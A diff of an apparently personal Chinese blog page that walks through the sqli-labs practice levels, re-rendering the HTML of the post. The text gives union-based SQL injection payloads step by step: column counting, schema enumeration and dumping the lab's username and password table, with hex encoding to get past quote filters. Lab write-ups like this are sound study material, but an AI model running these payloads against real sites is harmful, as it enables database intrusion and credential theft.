@@ -34,13 +34,13 @@
   <!-- 页面元数据 -->
   <title>sqli-labs-1-8 - Dr4x3zz</title>
   <meta name="keywords" content="sqli-labs,null">
-  <meta desc name="description" content="# sqli-labs-1-8 - Dr4x3zz - Dr4x3zz">
+  <meta desc name="description" content="sqli-labs-1-8 - Dr4x3zz - Dr4x3zz">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs-1-8">
 <meta property="og:url" content="https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/index.html">
 <meta property="og:site_name" content="Dr4x3zz">
-<meta property="og:description" content="# sqli-labs-1-8">
+<meta property="og:description" content="sqli-labs-1-8">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-12-21T12:20:08.000Z">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903703248),
+    lastupdate: new Date(1728903825782),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,154 +2585,80 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h2 id="sqli-labs-1-8"><a class="markdownIt-Anchor" href="#sqli-labs-1-8">#</a> sqli-labs-1-8</h2>
-<span id="more"></span>
-<h3 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h3>
-<h4 id="sql注入常用"><a class="markdownIt-Anchor" href="#sql注入常用">#</a> SQL 注入常用</h4>
-<blockquote>
-<p><strong>information_schema：表示所有信息，包括库、表、列</strong><br>
-<strong> information_schema.tables：记录所有表名信息的表</strong><br>
-<strong> information_schema.columns：记录所有列名信息的表</strong><br>
-<strong> table_schema：数据库的名称</strong><br>
-<strong> table_name: 表名</strong><br>
-<strong> column_name: 列名</strong><br>
-<strong> group_concat (): 显示所有查询到的数据</strong></p>
+    <h2 id="sqli-labs-1-8"><a href="#sqli-labs-1-8" class="headerlink" title="sqli-labs-1-8"></a>sqli-labs-1-8</h2><span id="more"></span>
+
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="SQL注入常用"><a href="#SQL注入常用" class="headerlink" title="SQL注入常用"></a>SQL注入常用</h4><blockquote>
+<p><strong>information_schema：表示所有信息，包括库、表、列</strong><br><strong>information_schema.tables：记录所有表名信息的表</strong><br><strong>information_schema.columns：记录所有列名信息的表</strong><br><strong>table_schema：数据库的名称</strong><br><strong>table_name:表名</strong><br><strong>column_name:列名</strong><br><strong>group_concat():显示所有查询到的数据</strong></p>
 </blockquote>
-<h4 id="哪里存在sql注入"><a class="markdownIt-Anchor" href="#哪里存在sql注入">#</a> 哪里存在 SQL 注入？</h4>
-<p><strong>·</strong> <strong>GET</strong><br>
-<strong>·</strong> <strong>POST</strong><br>
-<strong>·</strong> <strong>HTTP 头部注入</strong><br>
-<strong>・</strong> <strong>Cookie 注入</strong></p>
-<h4 id="sql注入的类型"><a class="markdownIt-Anchor" href="#sql注入的类型">#</a> sql 注入的类型</h4>
-<p>1、字符型注入<br>
- 2、数字型注入</p>
-<h4 id="mysql中3种注释风格"><a class="markdownIt-Anchor" href="#mysql中3种注释风格">#</a> MySQL 中 3 种注释风格</h4>
-<blockquote>
-<p>‘#’ （url 编码为 %23）<br>
-‘–’ （–后边要跟上一个或多个空格 --+）</p>
+<h4 id="哪里存在SQL注入？"><a href="#哪里存在SQL注入？" class="headerlink" title="哪里存在SQL注入？"></a>哪里存在SQL注入？</h4><p><strong>·</strong> <strong>GET</strong><br><strong>·</strong> <strong>POST</strong><br><strong>·</strong> <strong>HTTP头部注入</strong><br><strong>·</strong> <strong>Cookie注入</strong></p>
+<h4 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h4><p>1、字符型注入<br>2、数字型注入</p>
+<h4 id="MySQL中3种注释风格"><a href="#MySQL中3种注释风格" class="headerlink" title="MySQL中3种注释风格"></a>MySQL中3种注释风格</h4><blockquote>
+<p>‘#’ （url编码为%23）<br>‘–’ （–后边要跟上一个或多个空格 –+）</p>
 </blockquote>
-<h4 id="判断注入点"><a class="markdownIt-Anchor" href="#判断注入点">#</a> 判断注入点</h4>
-<blockquote>
-<p>and 1=1 /and 1=2 回显页面不同（整形判断）<br>
-若在 GET 请求中？id=1 and 1=1 和？id=1 and 1=2 都没有报错，则是字符型注入。<br>
-若在 GET 请求中？id=1 and 1=1 没有报错，但是？id=1 and 1=2 有异常或没回显，则是数字型注入。<br>
-单引号判断 ’ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</p>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><blockquote>
+<p>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整形判断）<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1和?id&#x3D;1 and 1&#x3D;2都没有报错，则是字符型注入。<br>若在GET请求中?id&#x3D;1 and 1&#x3D;1没有报错，但是?id&#x3D;1 and 1&#x3D;2有异常或没回显，则是数字型注入。<br>单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</p>
 </blockquote>
-<h4 id="步骤"><a class="markdownIt-Anchor" href="#步骤">#</a> 步骤</h4>
-<h5 id="1-判断列数"><a class="markdownIt-Anchor" href="#1-判断列数">#</a> 1、判断列数</h5>
-<blockquote>
-<p>order by 1<br>
-order by 2<br>
-…<br>
-order by 70</p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><h5 id="1、判断列数"><a href="#1、判断列数" class="headerlink" title="1、判断列数"></a>1、判断列数</h5><blockquote>
+<p>order by 1<br>order by 2<br>…<br>order by 70</p>
 </blockquote>
-<h5 id="2-判断显示位"><a class="markdownIt-Anchor" href="#2-判断显示位">#</a> 2、判断显示位</h5>
-<blockquote>
-<p>url?id=-1 union select 1,2,3,4,5</p>
+<h5 id="2、判断显示位"><a href="#2、判断显示位" class="headerlink" title="2、判断显示位"></a>2、判断显示位</h5><blockquote>
+<p>url?id&#x3D;-1 union select 1,2,3,4,5</p>
 </blockquote>
-<h5 id="3-获取当数据库名称和当前连接数据库的用户"><a class="markdownIt-Anchor" href="#3-获取当数据库名称和当前连接数据库的用户">#</a> 3、获取当数据库名称和当前连接数据库的用户</h5>
-<blockquote>
-<p>url?id=-1 union select 1,2,databaes(),4,5<br>
-url?id=-1 union select 1,2,user(),4,5</p>
+<h5 id="3、获取当数据库名称和当前连接数据库的用户"><a href="#3、获取当数据库名称和当前连接数据库的用户" class="headerlink" title="3、获取当数据库名称和当前连接数据库的用户"></a>3、获取当数据库名称和当前连接数据库的用户</h5><blockquote>
+<p>url?id&#x3D;-1 union select 1,2,databaes(),4,5<br>url?id&#x3D;-1 union select 1,2,user(),4,5</p>
 </blockquote>
-<h5 id="4-列出所有数据库"><a class="markdownIt-Anchor" href="#4-列出所有数据库">#</a> 4、列出所有数据库</h5>
-<blockquote>
-<p><strong>limit 一个一个打印出来库名</strong><br>
- select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br>
-<strong>group_concat 一次性全部显示</strong><br>
- select group_concat (SCHEMA_NAME) from information_schema.SCHEMATA</p>
+<h5 id="4、列出所有数据库"><a href="#4、列出所有数据库" class="headerlink" title="4、列出所有数据库"></a>4、列出所有数据库</h5><blockquote>
+<p><strong>limit 一个一个打印出来库名</strong><br>select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br><strong>group_concat 一次性全部显示</strong><br>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</p>
 </blockquote>
-<h5 id="5-列出数据库test中所有的表"><a class="markdownIt-Anchor" href="#5-列出数据库test中所有的表">#</a> 5、列出 (数据库：test) 中所有的表</h5>
-<blockquote>
-<p><strong>limit 一个一个打印出来字段名</strong><br>
- select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=‘test’<br>
-limit 0,1<br>
-<strong>group_concat 一次性全部显示</strong><br>
- select group_concat (TABLE_NAME) from information_schema.TABLES where<br>
-TABLE_SCHEMA=0x674657374<br>
- 注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
+<h5 id="5、列出-数据库：test-中所有的表"><a href="#5、列出-数据库：test-中所有的表" class="headerlink" title="5、列出(数据库：test)中所有的表"></a>5、列出(数据库：test)中所有的表</h5><blockquote>
+<p><strong>limit 一个一个打印出来字段名</strong><br>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;‘test’<br>limit 0,1<br><strong>group_concat 一次性全部显示</strong><br>select group_concat(TABLE_NAME) from information_schema.TABLES where<br>TABLE_SCHEMA&#x3D;0x674657374<br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
 </blockquote>
-<h5 id="6-列出数据库test-表admin-中所有的字段"><a class="markdownIt-Anchor" href="#6-列出数据库test-表admin-中所有的字段">#</a> 6、列出（数据库：test 表：admin ）中所有的字段</h5>
-<blockquote>
-<p><strong>limit 一个一个打印出来</strong><br>
- select COLUMN_NAME from information_schema.COLUMNS where<br>
-TABLE_SCHEMA=‘baji’ and TABLE_NAME=‘users’ limit 0,1<br>
-<strong>group_concat 一次性全部显示</strong><br>
- select group_concat (COLUMN_NAME) from information_schema.COLUMNS where<br>
-TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</p>
+<h5 id="6、列出（数据库：test-表：admin-）中所有的字段"><a href="#6、列出（数据库：test-表：admin-）中所有的字段" class="headerlink" title="6、列出（数据库：test 表：admin ）中所有的字段"></a>6、列出（数据库：test 表：admin ）中所有的字段</h5><blockquote>
+<p><strong>limit 一个一个打印出来</strong><br>select COLUMN_NAME from information_schema.COLUMNS where<br>TABLE_SCHEMA&#x3D;‘baji’ and TABLE_NAME&#x3D;‘users’ limit 0,1<br><strong>group_concat 一次性全部显示</strong><br>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA&#x3D;0x74657374 and TABLE_NAME&#x3D;0x61646d696e</p>
 </blockquote>
-<h5 id="7-列出数据库test-表admin-中的数据"><a class="markdownIt-Anchor" href="#7-列出数据库test-表admin-中的数据">#</a> 7、列出（数据库：test 表：admin ）中的数据</h5>
-<blockquote>
-<p><strong>limit 一个一个打印出来</strong><br>
- select username,passwd from test.admin limit 0,1<br>
-<strong>group_concat 把 一次性全部打印</strong><br>
- select group_concat (concat (username,0x20,passwd)) from test.admin<br>
-network</p>
+<h5 id="7、列出（数据库：test-表：admin-）中的数据"><a href="#7、列出（数据库：test-表：admin-）中的数据" class="headerlink" title="7、列出（数据库：test 表：admin ）中的数据"></a>7、列出（数据库：test 表：admin ）中的数据</h5><blockquote>
+<p><strong>limit 一个一个打印出来</strong><br>select username,passwd from test.admin limit 0,1<br><strong>group_concat 把 一次性全部打印</strong><br>select group_concat(concat(username,0x20,passwd)) from test.admin<br>network</p>
 </blockquote>
 <p>本文参考参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/93498444">https://blog.csdn.net/qq_37133717/article/details/93498444</a></p>
-<h3 id="sqli-labs-1"><a class="markdownIt-Anchor" href="#sqli-labs-1">#</a> sqli-labs-1</h3>
-<p>通过题目的名字 &quot;GET-Error based - Single quotes - String (基于 GET 错误 - 单引号 - 字符串)&quot; 可知，题目是一个单引号引起的字符型</p>
-<p>在 url 后面输入？id=1 and 1=1,url?id=1 1=2 后发现页面正常没有不同，考虑为字符型<br>
-添加单引号后，页面出现</p>
+<h3 id="sqli-labs-1"><a href="#sqli-labs-1" class="headerlink" title="sqli-labs-1"></a>sqli-labs-1</h3><p>通过题目的名字”GET-Error based - Single quotes - String(基于 GET 错误 - 单引号 - 字符串)”可知，题目是一个单引号引起的字符型</p>
+<p>在url后面输入?id&#x3D;1 and 1&#x3D;1,url?id&#x3D;1 1&#x3D;2后发现页面正常没有不同，考虑为字符型<br>添加单引号后，页面出现</p>
 <blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p>可以看到存在’' 包装<br>
-继续在后面添加–+</p>
+<p>可以看到存在’’包装<br>继续在后面添加–+</p>
 <blockquote>
-<p>url?id=1’ --+<br>
- 发现页面异常，存在单引号的注入问题</p>
+<p>url?id&#x3D;1’ –+<br>发现页面异常，存在单引号的注入问题</p>
 </blockquote>
-<h4 id="用order-by猜解列数"><a class="markdownIt-Anchor" href="#用order-by猜解列数">#</a> 用 order by 猜解列数</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 order 1 --+</span><br></pre></td></tr></table></figure>
+<h4 id="用order-by猜解列数"><a href="#用order-by猜解列数" class="headerlink" title="用order by猜解列数"></a>用order by猜解列数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 order 1 --+</span><br></pre></td></tr></table></figure>
 <p>依次使用</p>
 <blockquote>
-<p>order 2<br>
-order 3<br>
-order 4<br>
-<strong> 页面显示 Unknown column ‘4’ in 'order clause’</strong><br>
-说明一共有三个字段</p>
+<p>order 2<br>order 3<br>order 4<br><strong>页面显示Unknown column ‘4’ in ‘order clause’</strong><br>说明一共有三个字段</p>
 </blockquote>
-<h4 id="显示回显位"><a class="markdownIt-Anchor" href="#显示回显位">#</a> 显示回显位</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<h4 id="显示回显位"><a href="#显示回显位" class="headerlink" title="显示回显位"></a>显示回显位</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:2<br>
-Your Password:3<br>
- 得出可显字段为 2 和 3<br>
- 所以我们查找数据库</p>
+<p>Your Login name:2<br>Your Password:3<br>得出可显字段为2和3<br>所以我们查找数据库</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
 <p>或者</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:security<br>
-Your Password:3<br>
- 得出数据库名称为：security</p>
+<p>Your Login name:security<br>Your Password:3<br>得出数据库名称为：security</p>
 </blockquote>
-<h4 id="爆数据"><a class="markdownIt-Anchor" href="#爆数据">#</a> 爆数据</h4>
-<h5 id="查询表名"><a class="markdownIt-Anchor" href="#查询表名">#</a> 查询表名</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><h5 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:emails,referers,uagents,users<br>
-Your Password:3<br>
- 得出表名为 emails,referers,uagents,users</p>
+<p>Your Login name:emails,referers,uagents,users<br>Your Password:3<br>得出表名为emails,referers,uagents,users</p>
 </blockquote>
-<h5 id="查询列明"><a class="markdownIt-Anchor" href="#查询列明">#</a> 查询列明</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<h5 id="查询列明"><a href="#查询列明" class="headerlink" title="查询列明"></a>查询列明</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password<br>
-Your Password:3<br>
- 得出列名为 id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password</p>
+<p> Your Login name:id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password<br>Your Password:3<br>得出列名为id,email_id,id,referer,ip_address,id,uagent,ip_address,username,id,username,password</p>
 </blockquote>
-<h5 id="查询数据"><a class="markdownIt-Anchor" href="#查询数据">#</a> 查询数据</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,username,password from users limit 0,1 --+</span><br></pre></td></tr></table></figure>
-<p><em>这里采用 limit 0,1，因为用 group_concat（）一次爆出多条数据，不方便我们查看相对应的用户名和密码</em></p>
-<p>依次增加 0,1   1,1   2,1   3,1 直至页面无数据显示<br>
-将分别得到的内容整合成一个表，如下：</p>
+<h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and 1=2 union select 1,username,password from users limit 0,1 --+</span><br></pre></td></tr></table></figure>
+<p><em>这里采用limit 0,1，因为用group_concat（）一次爆出多条数据，不方便我们查看相对应的用户名和密码</em></p>
+<p>依次增加0,1   1,1   2,1   3,1直至页面无数据显示<br>将分别得到的内容整合成一个表，如下：</p>
 <table>
 <thead>
 <tr>
@@ -2740,8 +2666,7 @@ Your Password:3<br>
 <th>password</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>Dumb</td>
 <td>Dumb</td>
 </tr>
@@ -2773,246 +2698,196 @@ Your Password:3<br>
 <td>admin</td>
 <td>admin</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <p>若想直接爆出所有用户名和密码可以这样写</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>
-Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin<br>
- 按顺序对应各自的 username 和 password</p>
+<p> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin<br>按顺序对应各自的username和password</p>
 </blockquote>
-<h2 id="sqli-labs-2"><a class="markdownIt-Anchor" href="#sqli-labs-2">#</a> sqli-labs-2</h2>
-<h4 id="初步判断"><a class="markdownIt-Anchor" href="#初步判断">#</a> 初步判断</h4>
-<p>输入？id=1 得出页面回显</p>
+<h2 id="sqli-labs-2"><a href="#sqli-labs-2" class="headerlink" title="sqli-labs-2"></a>sqli-labs-2</h2><h4 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h4><p>输入?id&#x3D;1得出页面回显</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:Dumb<br>
-Your Password:Dumb</p>
+<p>Your Login name:Dumb<br>Your Password:Dumb</p>
 </blockquote>
-<p>接着在 url 后添加’</p>
+<p>接着在url后添加’</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
+<p> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1 </p>
 </blockquote>
-<p>说明 SQL 语法错误 <strong>‘’ LIMIT 0,1’ at line 1</strong> 显示添加后语法中多了一个’，说明本题不需要闭合<br>
-用 1=1，1=2 判断为字符还是数字</p>
+<p>说明SQL语法错误 <strong>‘’ LIMIT 0,1’ at line 1</strong> 显示添加后语法中多了一个’，说明本题不需要闭合<br>用1&#x3D;1，1&#x3D;2判断为字符还是数字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=1</span><br><span class="line">url?id=1 and 1=2</span><br></pre></td></tr></table></figure>
-<p>发现 1=2 异常说明本题为数字型注入</p>
-<h4 id="查询列数"><a class="markdownIt-Anchor" href="#查询列数">#</a> 查询列数</h4>
-<p>使用 order</p>
+
+<p>发现1&#x3D;2异常说明本题为数字型注入</p>
+<h4 id="查询列数"><a href="#查询列数" class="headerlink" title="查询列数"></a>查询列数</h4><p>使用order</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 order by 1 --+</span><br><span class="line">order by 2</span><br><span class="line">...</span><br><span class="line">url?id=1 and 1=2 order by 4 --+</span><br></pre></td></tr></table></figure>
+
 <p>这时候页面异常显示</p>
 <blockquote>
-<p>Unknown column ‘4’ in ‘order clause’<br>
-说明只有三列</p>
+<p>Unknown column ‘4’ in ‘order clause’<br>说明只有三列</p>
 </blockquote>
-<h4 id="确定哪个字段有回显"><a class="markdownIt-Anchor" href="#确定哪个字段有回显">#</a> 确定哪个字段有回显</h4>
-<p>使用 union select 联合注入</p>
+<h4 id="确定哪个字段有回显"><a href="#确定哪个字段有回显" class="headerlink" title="确定哪个字段有回显"></a>确定哪个字段有回显</h4><p>使用union select联合注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:2<br>
-Your Password:3</p>
+<p>Your Login name:2<br>Your Password:3</p>
 </blockquote>
 <p>得出二三列回显</p>
-<h4 id="确定当前数据库名称"><a class="markdownIt-Anchor" href="#确定当前数据库名称">#</a> 确定当前数据库名称</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+<h4 id="确定当前数据库名称"><a href="#确定当前数据库名称" class="headerlink" title="确定当前数据库名称"></a>确定当前数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:security<br>
-Your Password:3</p>
+<p>Your Login name:security<br>Your Password:3</p>
 </blockquote>
-<p>得出数据库名称为 security</p>
-<h4 id="得出数据库所有表名"><a class="markdownIt-Anchor" href="#得出数据库所有表名">#</a> 得出数据库所有表名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>得出数据库名称为security</p>
+<h4 id="得出数据库所有表名"><a href="#得出数据库所有表名" class="headerlink" title="得出数据库所有表名"></a>得出数据库所有表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:emails,referers,uagents,users<br>
-Your Password:3</p>
+<p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p>
 </blockquote>
-<p>得出数据库的所有表名为<strong> emails,referers,uagents,users</strong></p>
-<h4 id="得出数据库所有列名"><a class="markdownIt-Anchor" href="#得出数据库所有列名">#</a> 得出数据库所有列名</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>得出数据库的所有表名为<strong>emails,referers,uagents,users</strong></p>
+<h4 id="得出数据库所有列名"><a href="#得出数据库所有列名" class="headerlink" title="得出数据库所有列名"></a>得出数据库所有列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username<br>
-Your Password:3</p>
+<p>Your Login name:email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username<br>Your Password:3</p>
 </blockquote>
-<p>得出所有列名为<br>
-<strong> email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username</strong><br>
- 如果只想获得 uesr 表中的列名，方便我们查找的话，可以继续添加一些内容</p>
+<p>得出所有列名为<br><strong>email_id,id,id,ip_address,referer,id,ip_address,uagent,username,id,password,username</strong><br>如果只想获得uesr表中的列名，方便我们查找的话，可以继续添加一些内容</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27;  and table_name = &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:id,password,username<br>
-Your Password:3</p>
+<p>Your Login name:id,password,username<br>Your Password:3</p>
 </blockquote>
-<p>得出 users 表中的列名为<strong> id,password,username</strong></p>
-<h4 id="得出users表中的所有username和password"><a class="markdownIt-Anchor" href="#得出users表中的所有username和password">#</a> 得出 users 表中的所有 username 和 password</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+<p>得出users表中的列名为<strong>id,password,username</strong></p>
+<h4 id="得出users表中的所有username和password"><a href="#得出users表中的所有username和password" class="headerlink" title="得出users表中的所有username和password"></a>得出users表中的所有username和password</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure>
+
 <p>页面显示</p>
 <blockquote>
-<p>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin<br>
-Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin</p>
